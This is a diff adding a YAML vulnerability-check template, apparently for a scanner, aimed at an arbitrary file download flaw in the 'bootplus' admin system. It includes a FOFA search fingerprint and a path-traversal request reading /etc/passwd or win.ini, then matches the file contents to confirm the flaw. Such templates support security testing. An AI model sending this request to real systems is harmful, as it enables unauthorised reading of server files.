@@ -1,0 +1,19 @@
+id: poc-yaml-bootplus-file-download
+info:
+  name: bootplus管理系统 file/download 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: bootplus
+  fofa: body="/statics/css/admin/AdminLTE.min.css"
+variables:
+  r_data_linux: '/etc/passwd
+
+    C://windows/win.ini'
+requests:
+- method: GET
+  path: /file/download?name={{.r_data_linux}}&real=1
+  expression: "status_code == 200 &&\n((\ncontains(body, \"bit app support\") && \n\
+    contains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nmatches(body,\
+    \ \"root:.*:0:0:\")\n))\n"
+transport: http
